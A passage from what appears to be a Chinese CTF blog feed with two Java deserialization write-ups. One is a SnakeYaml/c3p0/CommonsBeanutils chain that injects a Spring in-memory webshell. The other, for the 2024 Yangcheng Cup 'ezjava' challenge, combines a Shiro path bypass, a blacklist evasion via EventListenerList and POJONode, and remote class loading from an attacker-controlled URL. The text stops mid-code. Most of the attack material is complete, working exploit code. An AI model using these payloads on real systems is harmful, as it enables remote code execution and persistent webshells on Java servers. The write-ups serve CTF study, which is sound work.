class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;loadClass&quot;</span>, <span class="title class_">String</span>.<span class="property">class</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; loadedClass = (<span class="title class_">Class</span>&lt;?&gt;) loadClassMethod.<span class="title function_">invoke</span>(classLoader, code);</span><br><span class="line">        loadedClass.<span class="title function_">newInstance</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØËøôÈáåÊàëÊú¨Âú∞‰∏ÄÁõ¥Â§±Ë¥•ÔºåÂêéÁª≠ÂèëÁé∞ÁßªÂä®jdkÂà∞<code>/usr/lib/jvm/</code> ‰∏ãÂ∞±Ë°å‰∫ÜÔºåÂè¶Â§ñ‰∏äÈù¢Ëøô‰∏™pocËøêË°åÂæóÊîæÂú®JavaÁõÆÂΩï‰∏ãÔºåÂèçÂ∞Ñ‰∏çËÉΩÂä†ÂåÖÂêçÔºå‰∏çÁÑ∂ÂêéÁª≠Âä†ËΩΩ‰ºöÂä†ËΩΩ‰∏çÂà∞</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%206.png" alt="image.png"></p><p>Èù∂Âú∫‰πüOK</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%207.png" alt="image.png"></p><p>ÂêéÁª≠Â≠¶‰∏Ä‰∏ãjarÊÄé‰πàÂÜôÁöÑÔºåÊáí‰∫ÜÔºåËøôÈáå‰∏çÊÉ≥Âä®‰∫Ü</p><h1 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h1><aside>üí°<p>yamlÊâìc3p0‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñÔºå‰∏çÂá∫ÁΩëÊâìÂÜÖÂ≠òÈ©¨</p><p>Âà©Áî®snakeyamlÂèçÂ∫èÂàóÂåñ‰ºöË∞ÉÁî®ÊûÑÈÄ†ÊñπÊ≥ïÂíågetterÊñπÊ≥ïÁâπÊÄßÊâìc3p0ÁöÑ<code>*WrapperConnectionPoolDataSource</code>* ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂà©Áî®ÂÖ∂hexÂ≠óËäÇÁ†ÅÂä†ËΩΩÂô®‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñÊâìÂÜÖÂ≠òÈ©¨</p><p>Áúã‰æùËµñËøòÊúâ‰∏™CBÔºåÊâÄ‰ª•Áõ¥Êé•Âà©Áî®CBÂéªÊâìÂÜÖÂ≠òÈ©¨Âç≥ÂèØ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%208.png" alt="image.png"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">xiinnn</span>.<span class="property">SnakeYaml</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">bcel</span>.<span class="property">internal</span>.<span class="property">Repository</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">trax</span>.<span class="property">TemplatesImpl</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">trax</span>.<span class="property">TransformerFactoryImpl</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">xiinnn</span>.<span class="property">commonly</span>.<span class="property">SpringMemShell</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">commons</span>.<span class="property">beanutils</span>.<span class="property">BeanComparator</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.*;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Field</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">PriorityQueue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Âà©Áî®snakeyamlËß¶ÂèëÊûÑÈÄ†ÂáΩÊï∞ÁöÑÁâπÊÄßÔºåÂéªËß¶Âèëc3p0ÁöÑWrapperConnectionPoolDataSourceÔºåÁÑ∂Âêé‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñ</span></span><br><span class="line"><span class="comment"> * ËøôÊù°ÈìæÊòØÊâìreadObjectÔºåÊâÄ‰ª•ÂèØ‰ª•ÊâìÂÜÖÂ≠òÈ©¨Â∫îÂØπ‰∏çÂá∫ÁΩëÊÉÖÂÜµ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">CB2C3p0TOSnakeYaml</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line">        byte[] bytes = <span class="title class_">Repository</span>.<span class="title function_">lookupClass</span>(<span class="title class_">SpringMemShell</span>.<span class="property">class</span>).<span class="title function_">getBytes</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title class_">TemplatesImpl</span> templates = <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="title function_">setFieldValue</span>(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> byte[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="title function_">setFieldValue</span>(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="title function_">setFieldValue</span>(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        BeanComparator beanComparator = new BeanComparator(); //‰æùËµñ‰∫éCCÂ∫ì</span></span><br><span class="line">        <span class="title class_">BeanComparator</span> beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, <span class="title class_">String</span>.<span class="property">CASE_INSENSITIVE_ORDER</span>); <span class="comment">//‰∏ç‰æùËµñCCÂ∫ì</span></span><br><span class="line">        <span class="title class_">PriorityQueue</span>&lt;<span class="title class_">Object</span>&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,beanComparator);</span><br><span class="line"></span><br><span class="line">        queue.<span class="title function_">add</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.<span class="title function_">add</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">setFieldValue</span>(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//        beanComparator.compare(templates, templates);</span></span><br><span class="line">        <span class="title function_">setFieldValue</span>(queue,<span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> <span class="title class_">Serhex</span> = <span class="title function_">bytesToHexString</span>(<span class="title function_">serialize</span>(queue));</span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> hexcode = <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userOverridesAsString: HexAsciiSerializedMap:&quot;</span> + <span class="title class_">Serhex</span> + <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(hexcode);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Unserialize(&quot;sercb.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Â∞ÜÂØπË±°Â∫èÂàóÂåñ‰∏∫Â≠óËäÇÊï∞ÁªÑ</span></span><br><span class="line">    public <span class="keyword">static</span> byte[] <span class="title function_">serialize</span>(<span class="title class_">Object</span> obj) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="title class_">ByteArrayOutputStream</span> bos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">             <span class="title class_">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos)) &#123;</span><br><span class="line">            oos.<span class="title function_">writeObject</span>(obj);</span><br><span class="line">            <span class="keyword">return</span> bos.<span class="title function_">toByteArray</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Â∞ÜÂ≠óËäÇÊï∞ÁªÑËΩ¨Êç¢‰∏∫ÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">bytesToHexString</span>(<span class="params">byte[] byteArray</span>) &#123;</span><br><span class="line">        <span class="title class_">StringBuilder</span> sb = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte b : byteArray) &#123;</span><br><span class="line">            <span class="title class_">String</span> hex = <span class="title class_">Integer</span>.<span class="title function_">toHexString</span>(b &amp; <span class="number">0xFF</span>);</span><br><span class="line">            <span class="keyword">if</span> (hex.<span class="title function_">length</span>() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.<span class="title function_">append</span>(<span class="string">&#x27;0&#x27;</span>); <span class="comment">// Ë°•ÈΩê‰∏∫‰∏§‰Ωç</span></span><br><span class="line">            &#125;</span><br><span class="line">            sb.<span class="title function_">append</span>(hex.<span class="title function_">toUpperCase</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="title class_">Object</span> <span class="title class_">Unserialize</span>(<span class="title class_">String</span> filePath) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">ObjectInputStream</span> objectInputStream = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath));</span><br><span class="line">        <span class="title class_">Object</span> o = objectInputStream.<span class="title function_">readObject</span>();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span>(<span class="title class_">Object</span> obj, <span class="title class_">String</span> fieldName, <span class="title class_">Object</span> value) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title class_">Field</span> field = obj.<span class="title function_">getClass</span>().<span class="title function_">getDeclaredField</span>(fieldName);</span><br><span class="line">        field.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        field.<span class="title function_">set</span>(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠SpringMemShell‰∏∫springÂÜÖÂ≠òÈ©¨ÔºåÁîüÊàêÁöÑÁªìÊûúÂ¶Ç‰∏ã</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%209.png" alt="image.png"></p><p>urlÁºñÁ†Å‰∏Ä‰∏ãÊâìÂç≥ÂèØ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%2010.png" alt="image.png"></p><p>Êó•Â∏∏500ÔºåËÆøÈóÆ‰∏Ä‰∏ãshellÁúãÊòØÂê¶ÊâìÊàêÂäü‰∫Ü</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%2011.png" alt="image.png"></p><p>Áõ¥Êé•ËØªÂèñflagÂç≥ÂèØ</p><h1 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h1><p><a href="https://landgrey.me/blog/22/">LandGrey‚Äôs Blog</a></p><p><a href="https://mp.weixin.qq.com/s/n8RW0NIllcQ0sn3nI9uceA">https://mp.weixin.qq.com/s/n8RW0NIllcQ0sn3nI9uceA</a></p><p><a href="https://p0lar1ght.github.io/posts/PolarD&N_CTF_%E4%B8%80%E5%86%99%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%90%B1%E5%A3%B0/">ËÆ∞‰∏ÄÊ¨°CTFÂá∫È¢ò‰πã‰∏ÄÂÜô‰∏Ä‰∏™‰∏çÂê±Â£∞_WPÁØá | P0l@R19ht</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024ÁæäÂüéÊùØ-ezjava</title>
      <link href="/2024/08/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-ezjava/"/>
      <url>/2024/08/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-ezjava/</url>
      
        <content type="html"><![CDATA[<p>Ëøô‰∏™È¢òÈìæÂ≠êÂæàÁÆÄÂçïÔºåÈÉΩÊòØÂ∑≤ÁªèÂÖ¨ÂºÄÁöÑÔºåÂ∞±ÊòØÊúâ‰∫õÁÇπÊúâÁÇπÂùë</p><p>ÊãøÂà∞ÈôÑ‰ª∂ÂèçÁºñËØëÔºåÊú¨Âú∞Ëµ∑ÁéØÂ¢ÉÁî®cfrÂ∞±Ë°åÔºåÁ°ÆÂÆûÊØîËæÉÊñπ‰æø</p><h2 id="È¢òÁõÆÂàÜÊûê"><a href="#È¢òÁõÆÂàÜÊûê" class="headerlink" title="È¢òÁõÆÂàÜÊûê"></a>È¢òÁõÆÂàÜÊûê</h2><p>ËøôÈáåÊàë‰∏ÄÂºÄÂßãÊòØÁõ¥Êé•ÊâæÂèçÂ∫èÂàóÂåñÁöÑÁÇπÔºåÂú®<code>UserControler</code> ‰∏ã</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146907.png" alt="image.png"></p><p>‰ΩÜÊòØËøôÈáåÊúâshiroÊùÉÈôêÊ†°È™å</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146887.png" alt="image.png"></p><p>ÁúãshiroÁâàÊú¨1.2.4ÊòØÂèØ‰ª•ÁªïËøáÁöÑÔºåÂä†‰∏™<code>/</code> Âç≥ÂèØÁªïËøá</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146565.png" alt="image.png"></p><p>ÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•Êù•Âà∞ÂèçÂ∫èÂàóÂåñËøôÈáåÔºåÁÑ∂ÂêéÂ∞±ÊòØÈªëÂêçÂçï‰∫Ü</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">static</span> final <span class="title class_">String</span>[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="string">&quot;java.security.SignedObject&quot;</span>, <span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>, <span class="string">&quot;org.apache.commons.beanutils&quot;</span>, <span class="string">&quot;org.apache.commons.collections&quot;</span>, <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ËøôÈáåÁî®ÁöÑÊòØ<code>resolveClass</code> Âä†ËΩΩÁöÑÁ±ªÔºåÊâÄ‰ª•overlongencodingÊ≤°Ê≥ïÁªïÔºåËøôÈáåÂèØ‰ª•ÁúãÂà∞JacksonÁöÑÈÇ£Êù°Èìæ‰∏çÂú®ÈªëÂêçÂçïÊâÄ‰ª•Áõ¥Êé•Áî®ÈÇ£‰∏™ÈìæÂç≥ÂèØÔºå‰ΩÜÊòØ<code>BadAttributeValueExpException</code> Âú®ÈªëÂêçÂçïÔºåÂÖ∏ÂûãÁöÑËß¶ÂèëtoStringÊñπÊ≥ïÁöÑÁ±ªË¢´ban‰∫ÜÔºå‰ΩÜÊòØÊúÄËøëÂÖ¨ÂºÄ‰∫ÜÂæàÂ§öÔºåÂâç‰∏ç‰πÖÁöÑÈòøÈáå‰∫ëÂ∞±ÂÖ¨ÂºÄ‰∫Ü‰∏Ä‰∏™<code>EventListenerList</code> Á±ªËß¶ÂèëÔºåÂêåÊ†∑‰πüÊòØreadObjectÊñπÊ≥ïËß¶ÂèëÔºåÊâÄ‰ª•ÂæàÂ•ΩÁöÑÂπ≥Êõø‰∫Ü</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">EventListenerList</span> --&gt; <span class="title class_">UndoManager</span>#<span class="title function_">toString</span>() --&gt;<span class="title class_">Vector</span>#<span class="title function_">toString</span>() --&gt; <span class="title class_">POJONode</span>#<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>Êé•‰∏ãÊù•Â∞±ÊòØ<code>TemplatesImpl</code> ÔºåËøô‰∏™Ë¢´Âäû‰∫ÜÔºåÂΩìÊó∂Â∞±ÊòØÂú®ËøôÈáåÂç°Ê≠ª‰∫ÜÔºåbcelËøôÈáåÊ≤°‰æùËµñÊâì‰∏ç‰∫ÜÔºå<code>LdapAttribute</code> ‰πüÂú®ÈªëÂêçÂçïÔºåÊâÄ‰ª•Âè™Ââ©‰∏™ËøúÁ®ãÁ±ªÂä†ËΩΩÔºå‰∏ÄÂºÄÂßãÊàëÂøΩÁï•‰∫ÜUserÁ±ªÂêéÈù¢ÊâçÁúãÂà∞ÔºåËøòÊâæ‰∫ÜÂçäÂ§©ËøúÁ®ãÁ±ªÂä†ËΩΩÁöÑËß¶ÂèëÁÇπ„ÄÇ„ÄÇ„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146661.png" alt="image.png"></p><p>ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™UserÁ±ªÂä†ËΩΩËøúÁ®ãÁöÑÊñπÊ≥ïÊòØÂÖ∏ÂûãÁöÑgetterÔºåÈÇ£‰πàÈìæÂà∞ËøôÈáåÂ∞±Â•Ω‰∫ÜÔºå‰∏çËøáËøôÈáåban‰∫ÜhttpÂíåfileÔºåÁªïËøáÊñπÂºèÊàëÁü•ÈÅìÁöÑÊúâ‰∏§ÁßçÔºå‰∏ÄÁßçÊòØ<code>jar:http</code> ÔºåÂè¶‰∏ÄÁßçÊòØ<code>url:http</code> (ÂÅ∑Â≠¶Ëá™snowÂ∏àÂÇÖ)Ôºå‰∏∫‰ªÄ‰πàËÉΩÂ§üÁî®urlÁªïÂë¢ÔºåÁÆÄÂçïË∞ÉËØï‰∏Ä‰∏ãÂÖ∂ÂÆûÂ∞±ËÉΩÂèëÁé∞</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147952.png" alt="5ec2f8fc68b795e4a4f8bfdd9805bbd9.png"></p><p>URLÁ±ªÈáåÈù¢ÊúâÂ§ÑÁêÜurlÁöÑÈÄªËæë</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147540.png" alt="4fcf8f8e1b8457306a7e0ac83a02ebaa.png"></p><p>ÊâÄ‰ª•ËøôÊ†∑Â∞±ÂèØ‰ª•ÁªïËøá‰∫ÜÔºåÁÆÄÂçïË∞ÉËØï‰∫Ü‰∏Ä‰∏ãÊ≤°ÂÖ∑‰ΩìÁªÜÁúãÈÄªËæë</p><p>ÁÑ∂ÂêéÂùëÁÇπÊù•‰∫ÜÔºàÂÖ∂ÂÆû‰πü‰∏çËÉΩÁÆóÊòØÂùëÁÇπÔºåËøòÊòØËá™Â∑±Ê≤°ÂíãÁî®ËøáËøúÁ®ãÁ±ªÂä†ËΩΩÔºâÔºåËøôÈáåUserÁ±ª‰∏≠ÁöÑ<code>getGift</code> ÊñπÊ≥ïÂè™ÊòØÊääËøúÁ®ãË∑ØÂæÑÂéªÂä†ËΩΩËøõÂéªÔºåÂ¶ÇÊûú‰Ω†‰∏çËß¶ÂèëËøôÈáåÈÇ£‰πàÊòØ‰∏ç‰ºöÂéªËØ∑Ê±ÇËøúÁ®ãÁ±ªÁöÑÔºåÂè¶Â§ñ<code>URLClassLoader</code> ÊòØÂÖà‰ºö‰ªéÊú¨Âú∞Âä†ËΩΩÁ±ªÔºåÊâæ‰∏çÂà∞Êâç‰ºöÂä†ËΩΩËøúÁ®ãÁ±ªÔºåÊâÄ‰ª•‰Ω†ÁöÑÊÅ∂ÊÑèÁ±ª‰∏çËÉΩÂ∏¶ÂåÖÂêçÔºåÂê¶ÂàôÂÆÉÂ∞±‰ºöÂΩìÊàêÊòØ‰Ω†Êú¨Âú∞ÁöÑÁ±ªÔºå‰πü‰∏ç‰ºöÂéªËøúÁ®ãÂä†ËΩΩ‰∫Ü</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>ÈìæÂ≠êpayloadÂ¶Ç‰∏ãÔºåÊù•Ëá™Â§ßÂ§¥ÁöÑÈ°πÁõÆÁ®çÂæÆÊîπÊîπÂ∞±Ë°å<a href="https://github.com/LxxxSec/CTF-Java-Gadget">https://github.com/LxxxSec/CTF-Java-Gadget</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.myself;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ycbjava.bean.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ycb</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass0</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass0.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass0.removeMethod(writeReplace);</span><br><span class="line">        ctClass0.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;url:http://192.168.1.100:8888/&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//EventListenerList --&gt; UndoManager#toString() --&gt;Vector#toString() --&gt; POJONode#toString()</span></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Map.class, manager&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(list);</span><br><span class="line"></span><br><span class="line">        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span 